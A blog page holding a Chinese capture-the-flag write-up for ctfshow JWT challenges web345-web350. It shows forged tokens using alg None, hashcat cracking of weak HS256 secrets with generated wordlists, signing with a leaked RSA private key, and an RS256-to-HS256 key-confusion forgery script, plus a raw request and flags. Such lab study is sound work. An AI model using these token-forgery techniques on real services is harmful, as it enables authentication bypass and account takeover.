@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html data-theme="">
+<head>
+    <!-- ! 引用文件位置-->
+    <!--引用文件位置-->
+<meta charset="utf-8">
+<title>原神，启动！！</title>
+<!--    daisyui cdn-->
+<link href="https://cdn.jsdelivr.net/npm/daisyui@4.5.0/dist/full.min.css" rel="stylesheet" type="text/css"/>
+<!--     tailwindcss cdn daisyui 前置-->
+<script src="https://cdn.tailwindcss.com"></script>
+<!--    更改主题颜色-->
+<script src="https://cdn.jsdelivr.net/npm/theme-change@2.0.2/index.js"></script>
+<!--自动排版-->
+<!--    <link rel="stylesheet" href="https://unpkg.com/@tailwindcss/typography@^0.4.0/dist/typography.min.css" type="text/css">-->
+<script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
+<!--    谷歌字体库镜像-->
+<style>
+    @import url('https://fonts.font.im/css?family=Barlow:700|Bitter');
+</style>
+<!--jquery-->
+<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
+<!--    fancybox-->
+<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" type="text/css">
+<script src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+<!--highlight 代码高亮 使用hexo的不会高亮-->
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
+<script>
+    hljs.highlightAll();
+</script>
+<link rel="stylesheet"
+      href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/styles/vs2015.min.css">
+<!--    自定义css-->
+
+<link rel="stylesheet" href="/css/output.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<!--    自定义js-->
+
+<script src="/js/view.js"></script>
+
+
+<script src="/js/fancybox.js"></script>
+
+<!--去除referrer检测 要写在head里面 但是似乎影响进站查看-->
+<meta name="referrer" content="no-referrer"/>
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+<!--导航栏-->
+<div class="">
+    <div class="container-nav justify-center flex">
+        <div class="navbar bg-base-100 shadow-xl rounded-box w-10/12 my-6 z-10">
+            <div class="flex-1">
+                <a class="btn btn-ghost text-xl" href="/">原神，启动！</a>
+            </div>
+            <div class="flex-none gap-2">
+                <ul class="menu menu-horizontal px-1">
+                    
+                    
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/">首页</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/archives">文章</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/about">关于</a></li>
+                        
+                    
+                    <!--<li><a href="/">Home</a></li>-->
+                    <!--<li><a href="/archives">Archive</a></li>-->
+                    <!--<li><a href="/about/">About</a></li>-->
+                    <li>
+                        <details class="dropdown">
+                            <summary>
+                                更换主题
+                            </summary>
+                            <ul tabindex="0"
+                                class="dropdown-content z-[1] p-2 bg-base-100 rounded-box w-58 max-h-96 overflow-y-auto overflow-x-hidden shadow">
+                                <!--                                <li><a class="border-base-content/20 hover:border-base-content/40 overflow-hidden rounded-lg border outline outline-2 outline-offset-2 outline-transparent !outline-base-content" data-set-theme="emerald" data-act-class="!outline-base-content"><div data-theme="emerald" class="bg-base-100 text-base-content w-full cursor-pointer font-sans"><div class="grid grid-cols-5 grid-rows-3"><div class="bg-base-200 col-start-1 row-span-2 row-start-1"></div> <div class="bg-base-300 col-start-1 row-start-3"></div> <div class="bg-base-100 col-span-4 col-start-2 row-span-3 row-start-1 flex flex-col gap-1 p-2"><div class="font-bold">emerald</div> <div class="flex flex-wrap gap-1"><div class="bg-primary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-primary-content text-sm font-bold">A</div></div> <div class="bg-secondary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-secondary-content text-sm font-bold">A</div></div> <div class="bg-accent flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-accent-content text-sm font-bold">A</div></div> <div class="bg-neutral flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-neutral-content text-sm font-bold">A</div></div></div></div></div></div> </a></li>-->
+                                <!--主题选择配置，主题来自daisyui-->
+
+<li><a data-set-theme="light">Light</a></li>
+<li><a data-set-theme="dark">Night</a></li>
+<li><a data-set-theme="cupcake">Cupcake</a></li>
+<li><a data-set-theme="bumblebee">Bumblebee</a></li>
+<li><a data-set-theme="emerald">Emerald</a></li>
+<li><a data-set-theme="coporate">Corporate</a></li>
+<li><a data-set-theme="synthwave">Synthwave</a></li>
+<li><a data-set-theme="retro">Retro</a></li>
+<li><a data-set-theme="cyberpunk">Cyberpunk</a></li>
+<li><a data-set-theme="halloween">Halloween</a></li>
+<li><a data-set-theme="garden">Garden</a></li>
+<li><a data-set-theme="forest">Forest</a></li>
+<li><a data-set-theme="aqua">Aqua</a></li>
+<li><a data-set-theme="lofi">Lo-fi</a></li>
+<li><a data-set-theme="pastel">Pastel</a></li>
+<li><a data-set-theme="fantasy">Fantasy</a></li>
+<li><a data-set-theme="wireframe">Wireframe</a></li>
+<li><a data-set-theme="black">Black</a></li>
+<li><a data-set-theme="luxury">Luxury</a></li>
+<li><a data-set-theme="dracula">Dracula</a></li>
+<li><a data-set-theme="cmyk">CMYK</a></li>
+<li><a data-set-theme="autumn">Autumn</a></li>
+<li><a data-set-theme="business">Business</a></li>
+<li><a data-set-theme="acid">Acid</a></li>
+<li><a data-set-theme="lemonade">Lemonade</a></li>
+<li><a data-set-theme="night">Night</a></li>
+<li><a data-set-theme="coffee">Coffee</a></li>
+<li><a data-set-theme="winter">Winter</a></li>
+<li><a data-set-theme="dim">Dim</a></li>
+<li><a data-set-theme="nord">Nord</a></li>
+<li><a data-set-theme="sunset">Sunset</a></li>
+                            </ul>
+                        </details>
+                    </li>
+                </ul>
+                <div class="form-control">
+                    <input type="text" placeholder="Search is not yet!" class="input input-bordered w-24 md:w-auto"/>
+                </div>
+                <div class="dropdown dropdown-end">
+                    <div tabindex="0" role="button" class="btn btn-ghost btn-circle avatar">
+                        <div class="w-10 rounded-full">
+                            <img alt="Tailwind CSS Navbar component"
+                                 src="https://s3.bmp.ovh/imgs/2023/03/12/d3fe3843da0a1878.jpg"/>
+                        </div>
+                    </div>
+                    <!--TODO 完成这里-->
+                    <!--<ul tabindex="0"-->
+                    <!--    class="mt-3 z-[1] p-2 shadow menu menu-sm dropdown-content bg-base-100 rounded-box w-52">-->
+                    <!--    <li>-->
+                    <!--        <a class="justify-between">-->
+                    <!--            Profile-->
+                    <!--            <span class="badge">New</span>-->
+                    <!--        </a>-->
+                    <!--    </li>-->
+                    <!--    <li><a>Settings</a></li>-->
+                    <!--    <li><a>Logout</a></li>-->
+                    <!--</ul>-->
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!--导航栏结束-->
+<div class="fleet">
+    <!--    嵌套位置-->
+    <!-- 博客详情 -->
+
+
+<!--Post开始-->
+<div class="fleet container-nav justify-center flex mb-16 w-full">
+    <div class="w-8/12 justify-center flex">
+        <div class="fleet-body flex-col w-full">
+            <div class="fleet-header">
+                <div class="fleet-content-header-title text-6xl">
+                    <h1 class="inline-block font-extrabold mt-16 mb-8">web345-web350Jwt篇</h1>
+                </div>
+                <div class="fleet-content-header-info">
+                    <span>2023/12/08 14:47:55</span>
+                </div>
+            </div>
+            <div class="divider w-full"></div>
+            <div class="fleet-content mt-8">
+                <div class="fleet-content-body">
+                    <div class="fleet-content-body-content justify-center flex w-full">
+                        
+                        <!--代码块-->
+                        <!--高亮使用的prismjs需要将class中的python改为language-python-->
+                        
+                        <!--图片-->
+                        
+                        <article class="prose">
+                            <h1 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2338">https://xz.aliyun.com/t/2338</a></p>
+</blockquote>
+<p>jwt格式如下：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">header.payload.signature</code></pre>
+
+<ul>
+<li><p>Header 通常由两部分组成:token类型和哈希算法,例如:</p>
+<pre class="language-none"><code class="language-none">&#123;&quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;&#125;</code></pre>
+</li>
+<li><p>Payload 负载,存放有效信息的地方,比如用户ID,用户名等。它也可以存放私有数据。</p>
+</li>
+<li><p>Signature 签名,是对前两部分数据签名,防止数据篡改。它由 header 和 payload 使用算法生成,例如 HMAC-SHA256。</p>
+<pre class="language-none"><code class="language-none">标准中注册的声明 (建议但不强制使用) 
+# iss: jwt签发者
+# sub: jwt所面向的用户
+# aud: 接收jwt的一方
+# exp: jwt的过期时间，这个过期时间必须要大于签发时间
+# nbf: 定义在什么时间之前，该jwt都是不可用的
+# iat: jwt的签发时间
+# jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击</code></pre></li>
+</ul>
+<h1 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h1><p>源代码<code>/admin</code></p>
+<pre class="language-none"><code class="language-none">要注意使用 url 访问网页时
+&#x2F;admin	表示访问 admin.php 文件
+&#x2F;admin&#x2F;	表示访问 admin&#x2F;目录下的文件，默认是 index.php
+很像文件夹，所以此处应该访问 &#x2F;admin&#x2F;</code></pre>
+<p>cookie中auth：</p>
+<pre class="language-none"><code class="language-none">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2OTUyOTA0NTAsImV4cCI6MTY5NTI5NzY1MCwibmJmIjoxNjk1MjkwNDUwLCJzdWIiOiJ1c2VyIiwianRpIjoiODQ1YTFjN2Q1ODY5MGQ5MGJiZWJkZjAxNWYxZWFmOTQifV0</code></pre>
+<p><a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a> 直接在线解密：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695290625614-d99069b9-f084-40a0-88a0-148e61e78765.png" alt="image.png"><br>alg显示没有加密，那就直接将sub中改为admin，再base64加密即可。<br>前部分：</p>
+<pre class="language-none"><code class="language-none">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.WwogIHsKICAgICJpc3MiOiAiYWRtaW4iLAogICAgImlhdCI6IDE2OTUyOTExOTYsCiAgICAiZXhwIjogMTY5NTI5ODM5NiwKICAgICJuYmYiOiAxNjk1MjkxMTk2LAogICAgInN1YiI6ICJhZG1pbiIsCiAgICAianRpIjogIjk1Y2U2ZWE1ZmI1MTI0MzQxNzk5YTEwZmM5ZGM3ZTAyIgogIH0KXQ&#x3D;&#x3D;</code></pre>
+<pre class="language-none"><code class="language-none">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3sic3ViIjoiYWRtaW4ifV0</code></pre>
+<p>如果要有等号需要去掉等号。<br>这个上面怎么都传不进，看了视频发现，把jwt那个直接在hackbar里面base64decode一下，修改为admin，再base64加密，访问<code>/admin/</code>即可了：</p>
+<pre class="language-none"><code class="language-none">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0AW3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2OTUyOTIxODksImV4cCI6MTY5NTI5OTM4OSwibmJmIjoxNjk1MjkyMTg5LCJzdWIiOiJhZG1pbiIsImp0aSI6ImNmOGI3YWRmYmU1YTQwZWM1MTVjM2RiZWYxN2Y3MGE3In1d</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695292368648-e7712144-6927-4fd3-a898-f023d9111a22.png" alt="image.png"></p>
+<h1 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h1><p>解析发现算法为 HS256 ，但是可以通过将算法设定为None来绕过签名。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698825091212-4ec0d830-aaa1-4dcb-b978-99e446ccbdd3.png" alt="image.png"><br>从上到下依次为修改算法为None， sub改为admin，然后删除签名（signature）。<br>注意保留jwt最后面的.</p>
+<pre class="language-php" data-language="php"><code class="language-php">GET &#x2F;admin&#x2F; HTTP&#x2F;1.1
+Host: 82a441b0-3aca-4ca5-a55c-6d56aa369491.challenge.ctf.show
+Cache-Control: max-age&#x3D;0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;118.0.0.0 Safari&#x2F;537.36
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q&#x3D;0.9
+Cookie: auth&#x3D;eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5ODgyNTA0NSwiZXhwIjoxNjk4ODMyMjQ1LCJuYmYiOjE2OTg4MjUwNDUsInN1YiI6ImFkbWluIiwianRpIjoiYjIwYmEzMzBiZDM4MDA1ZWFkNzVlOTQ5Y2U3ODJjZmEifQ.
+Connection: close</code></pre>
+<p><code>ctfshow&#123;b94918f8-a660-4eef-91d3-04e17e3f78da&#125;</code></p>
+<h1 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h1><p>这关无法使用绕过，但是它提示说密钥是一个弱口令。<br>编写一个纯数字字典，如果不行的话再用别的：</p>
+<pre class="language-php" data-language="php"><code class="language-php">with open(&quot;dict.txt&quot;, &quot;a+&quot;) as f:
+    for i in range(0, 1000000):
+        f.write(str(i) + &#39;\n&#39;)</code></pre>
+<p>然后使用hashcat爆破一下密钥：</p>
+<pre class="language-php" data-language="php"><code class="language-php">hashcat -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5ODgyNTI4MSwiZXhwIjoxNjk4ODMyNDgxLCJuYmYiOjE2OTg4MjUyODEsInN1YiI6InVzZXIiLCJqdGkiOiIzMTYzMTM4YTNkZDFkMjljNWFmMTRlZmU5MTRlYzBmOCJ9.OAWm4kUqDv4Yc6VHgs2UcYgEw-RspCJuZdtAOv5OFh4 .&#x2F;dict.txt</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698826414139-6daac597-9160-4cff-ae75-25505026087a.png" alt="image.png"><br>密码为123456，然后我们自定义一下：<br>但是bp这个不可以选择密码，还得用jwt.io来搞：（记得修改sub为admin）</p>
+<pre class="language-php" data-language="php"><code class="language-php">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5ODgyNjQ4NywiZXhwIjoxNjk4ODMzNjg3LCJuYmYiOjE2OTg4MjY0ODcsInN1YiI6ImFkbWluIiwianRpIjoiNzc0ZjIyNzgzYTJkMzJiYzgyYjhlZDk4YzVkY2FlNDAifQ.aBkzVchQIdrXUdH6HLcEc5Jm-Nq2ve63x7LnsauRkJc</code></pre>
+<p><code>ctfshow&#123;a3bd8f39-f138-4ec8-a59a-bad1bfeb2591&#125;</code></p>
+<h1 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h1><p>爆破，估计有字符了，那就重新再写一个字典。<br>示例代码如下：</p>
+<pre class="language-php" data-language="php"><code class="language-php">import itertools
+
+# key &#x3D; &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;&#123;|&#125;~&#39;
+key &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;
+
+with open(&quot;dict_alphabet.txt&quot;, &quot;a+&quot;) as f:
+    passwords &#x3D; itertools.product(key, repeat&#x3D;4)
+    for i in passwords:
+        f.write(&quot;&quot;.join(i))
+        f.write(&quot;\n&quot;)
+    print(&quot;generate success&quot;)</code></pre>
+<pre class="language-php" data-language="php"><code class="language-php">hashcat -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY5ODg0MTE5MCwiZXhwIjoxNjk4ODQ4MzkwLCJuYmYiOjE2OTg4NDExOTAsInN1YiI6InVzZXIiLCJqdGkiOiJkNTY2Y2I1ZWExNWI0ODRmNzc5ZTBjMDE1ZjEzNTlkMCJ9.5BTUbhRJdFTlDaVlm3Sco8YhpWnkZVAkl30ISvvXjAg dict_alphabet.txt</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698841816867-3968d4dd-ecca-461f-a6ba-2f99e5be9312.png" alt="image.png"><br>密码为aaab 用相同操作进行修改内容即可。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698841934066-3ab25f1a-7054-4e2c-8176-258da2441517.png" alt="image.png"><br><code>ctfshow&#123;6e11c2c1-073f-48d8-8779-e0fae7897081&#125;</code></p>
+<h1 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h1><p>有个js页面：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&#x2F;* GET home page. *&#x2F;
+router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;
+  res.type(&#39;html&#39;);
+  var privateKey &#x3D; fs.readFileSync(process.cwd()+&#39;&#x2F;&#x2F;public&#x2F;&#x2F;private.key&#39;);
+  var token &#x3D; jwt.sign(&#123; user: &#39;user&#39; &#125;, privateKey, &#123; algorithm: &#39;RS256&#39; &#125;);
+  res.cookie(&#39;auth&#39;,token);
+  res.end(&#39;where is flag?&#39;);
+  
+&#125;);
+
+router.post(&#39;&#x2F;&#39;,function(req,res,next)&#123;
+	var flag&#x3D;&quot;flag_here&quot;;
+	res.type(&#39;html&#39;);
+	var auth &#x3D; req.cookies.auth;
+	var cert &#x3D; fs.readFileSync(process.cwd()+&#39;&#x2F;&#x2F;public&#x2F;public.key&#39;);  &#x2F;&#x2F; get public key
+	jwt.verify(auth, cert, function(err, decoded) &#123;
+	  if(decoded.user&#x3D;&#x3D;&#x3D;&#39;admin&#39;)&#123;
+	  	res.end(flag);
+	  &#125;else&#123;
+	  	res.end(&#39;you are not admin&#39;);
+	  &#125;
+	&#125;);
+&#125;);</code></pre>
+<p>信息泄露。<br>注意这个public是不出现在路由也就是<code>xxxx.com/private.key</code></p>
+<pre class="language-php" data-language="php"><code class="language-php">-----BEGIN PUBLIC KEY-----
+MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDNioS2aSHtu6WIU88oWzpShhkb
++r6QPBryJmdaR1a3ToD9sXDbeni5WTsWVKrmzmCk7tu4iNtkmn&#x2F;r9D&#x2F;bFcadHGnX
+YqlTJItOdHZio3Bi1J2Elxg8IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjA
+bG1Naz58ibbtogeglQIDAQAB
+-----END PUBLIC KEY-----</code></pre>
+<pre class="language-php" data-language="php"><code class="language-php">-----BEGIN RSA PRIVATE KEY-----
+MIICWwIBAAKBgQDNioS2aSHtu6WIU88oWzpShhkb+r6QPBryJmdaR1a3ToD9sXDb
+eni5WTsWVKrmzmCk7tu4iNtkmn&#x2F;r9D&#x2F;bFcadHGnXYqlTJItOdHZio3Bi1J2Elxg8
+IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjAbG1Naz58ibbtogeglQIDAQAB
+AoGAE+mAc995fvt3zN45qnI0EzyUgCZpgbWg8qaPyqowl2+OhYVEJq8VtPcVB1PK
+frOtnyzYsmbnwjZJgEVYTlQsum0zJBuTKoN4iDoV0Oq1Auwlcr6O0T35RGiijqAX
+h7iFjNscfs&#x2F;Dp&#x2F;BnyKZuu60boXrcuyuZ8qXHz0exGkegjMECQQD1eP39cPhcwydM
+cdEBOgkI&#x2F;E&#x2F;EDWmdjcwIoauczwiQEx56EjAwM88rgxUGCUF4R&#x2F;hIW9JD1vlp62Qi
+ST9LU4lxAkEA1lsfr9gF&#x2F;9OdzAsPfuTLsl+l9zpo1jjzhXlwmHFgyCAn7gBKeWdv
+ubocOClTTQ7Y4RqivomTmlNVtmcHda1XZQJAR0v0IZedW3wHPwnT1dJga261UFFA
++tUDjQJAERSE&#x2F;SvAb143BtkVdCLniVBI5sGomIOq569Z0+zdsaOqsZs60QJAYqtJ
+V7EReeQX8693r4pztSTQCZBKZ6mJdvwidxlhWl1q4+QgY+fYBt8DVFq5bHQUIvIW
+zawYVGZdwvuD9IgY&#x2F;QJAGCJbXA+Knw10B+g5tDZfVHsr6YYMY3Q24zVu4JXozWDV
+x+G39IajrVKwuCPG2VezWfwfWpTeo2bDmQS0CWOPjA&#x3D;&#x3D;
+-----END RSA PRIVATE KEY-----</code></pre>
+<h2 id="如何做nodejs"><a href="#如何做nodejs" class="headerlink" title="如何做nodejs"></a>如何做nodejs</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1vU4y187HE?p=5&vd_source=9c03c9cbee12e68c0989088a5b2ff127">https://www.bilibili.com/video/BV1vU4y187HE?p=5&vd_source&#x3D;9c03c9cbee12e68c0989088a5b2ff127</a></p>
+</blockquote>
+<p>目标目录下运行</p>
+<pre class="language-php" data-language="php"><code class="language-php">npx express-generator</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698843163505-fec5ff33-fee1-4727-a843-5a426cdbfe89.png" alt="image.png"><br>替换routes&#x2F;index.js下的内容<br>将公钥和私钥放入对应位置.<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698843325306-6147461c-a9ea-4806-87c2-0fa07b7eb0e7.png" alt="image.png"><br>之前没下过包的需要npm install 一下对应包，比如那些require的内容。<br>其中fs和jwt需要申明一下变量。jwt（是jsonwebtoken）<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698843930640-42dacf03-16bb-4e76-aa93-400a375a1c82.png" alt="image.png"><br>这个最后我还是报错，用cyberchef搞得：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://cyberchef.org/#recipe=JWT_Sign('-----BEGIN%20RSA%20PRIVATE%20KEY-----%5CnMIICWwIBAAKBgQDNioS2aSHtu6WIU88oWzpShhkb%2Br6QPBryJmdaR1a3ToD9sXDb%5Cneni5WTsWVKrmzmCk7tu4iNtkmn/r9D/bFcadHGnXYqlTJItOdHZio3Bi1J2Elxg8%5CnIEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjAbG1Naz58ibbtogeglQIDAQAB%5CnAoGAE%2BmAc995fvt3zN45qnI0EzyUgCZpgbWg8qaPyqowl2%2BOhYVEJq8VtPcVB1PK%5CnfrOtnyzYsmbnwjZJgEVYTlQsum0zJBuTKoN4iDoV0Oq1Auwlcr6O0T35RGiijqAX%5Cnh7iFjNscfs/Dp/BnyKZuu60boXrcuyuZ8qXHz0exGkegjMECQQD1eP39cPhcwydM%5CncdEBOgkI/E/EDWmdjcwIoauczwiQEx56EjAwM88rgxUGCUF4R/hIW9JD1vlp62Qi%5CnST9LU4lxAkEA1lsfr9gF/9OdzAsPfuTLsl%2Bl9zpo1jjzhXlwmHFgyCAn7gBKeWdv%5CnubocOClTTQ7Y4RqivomTmlNVtmcHda1XZQJAR0v0IZedW3wHPwnT1dJga261UFFA%5Cn%2BtUDjQJAERSE/SvAb143BtkVdCLniVBI5sGomIOq569Z0%2BzdsaOqsZs60QJAYqtJ%5CnV7EReeQX8693r4pztSTQCZBKZ6mJdvwidxlhWl1q4%2BQgY%2BfYBt8DVFq5bHQUIvIW%5CnzawYVGZdwvuD9IgY/QJAGCJbXA%2BKnw10B%2Bg5tDZfVHsr6YYMY3Q24zVu4JXozWDV%5Cnx%2BG39IajrVKwuCPG2VezWfwfWpTeo2bDmQS0CWOPjA%3D%3D%5Cn-----END%20RSA%20PRIVATE%20KEY-----','RS256')&input=ew0KICAidXNlciI6ICJhZG1pbiIsDQogICJpYXQiOiAxNjk4ODQxOTY1DQp9">cyberchef</a></p>
+</blockquote>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1698845146867-b28fcdc9-6919-4928-b309-59719152d0b0.png" alt="image.png"><br><code>ctfshow&#123;f7a45bf3-52c9-4bb7-87bc-ff0c2213a439&#125;</code></p>
+<h1 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h1><p>这个题也考JWT的三种常见的攻击方式之一把非对称算法 RS256 改为对称算法 HS256，用泄露的公钥签名数据，服务器尝试用公钥作为 secret 验证签名。也就是CVE-2016-5431漏洞<br><em>给定token和key检查是否valid，同时如果有callback将会调用</em><br><em>所以合法的token，在于签名是否合法，而并不取决于之前的签名采用什么样的算法，因为使用何种算法的信息也存在于给定的jwt中</em><br><em>所以只要将公钥修改为对称，然后伪造session</em><br>这里想要绕过就只能使用nodejs搭建来做了：</p>
+<pre class="language-php" data-language="php"><code class="language-php">router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;
+    const jwt &#x3D; require(&#39;jsonwebtoken&#39;);
+    const fs &#x3D; require(&#39;fs&#39;);
+
+    var privateKey &#x3D; fs.readFileSync(process.cwd()+&#39;\\public.key&#39;);
+&#x2F;&#x2F; console.log(privateKey);
+
+    var token &#x3D; jwt.sign(&#123; user: &#39;admin&#39; &#125;, privateKey, &#123; algorithm: &#39;HS256&#39; &#125;);
+    console.log(token)
+
+&#125;);</code></pre>
+<p>注意将公钥文件放在根目录下。</p>
+
+                        </article>
+                    </div>
+
+
+                    <div class="fleet-content-body-footer">
+                        <!--翻页器-->
+                        <div class="flex-row flex w-full justify-between">
+                            <div class="fleet-content-body-footer-left">
+                                
+                                    <div><a href="/posts/f5628547/"
+                                            class="btn btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M15.41,16.58L10.83,12L15.41,7.41L14,6L8,12L14,18L15.41,16.58Z"></path>
+                                            </svg>
+                                            <div class="flex flex-col items-start"><span
+                                                        class="text-base-content/50 hidden text-xs font-normal md:block">上一篇</span>
+                                                <span>web373-w</span></div>
+                                        </a></div>
+                                
+                            </div>
+                            <div class="fleet-content-body-footer-right">
+                                
+                                    <div><a href="/posts/12b4f39f/"
+                                            class="btn btn-neutral btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <div class="flex flex-col items-end"><span
+                                                        class="text-neutral-content/50 hidden text-xs font-normal md:block">下一篇</span>
+                                                <span>web334-web344NodeJS篇</span></div>
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z"></path>
+                                            </svg>
+                                        </a></div>
+
+                                
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+    <!--    嵌套位置结束-->
+
+
+
+
+
+    <!--<h3>categories</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/CTF/">-->
+    <!--                CTF-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/Python/">-->
+    <!--                Python-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+
+    <!--<h3>tags</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/WriteUp/">-->
+    <!--                WriteUp-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CISCN/">-->
+    <!--                CISCN-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/valorant/">-->
+    <!--                valorant-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/genshin/">-->
+    <!--                genshin-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Shortcut/">-->
+    <!--                Shortcut-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%AF%AD%E9%9B%80/">-->
+    <!--                语雀-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%84%9A%E6%9C%AC/">-->
+    <!--                脚本-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CTFshow0-1/">-->
+    <!--                CTFshow0-1-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
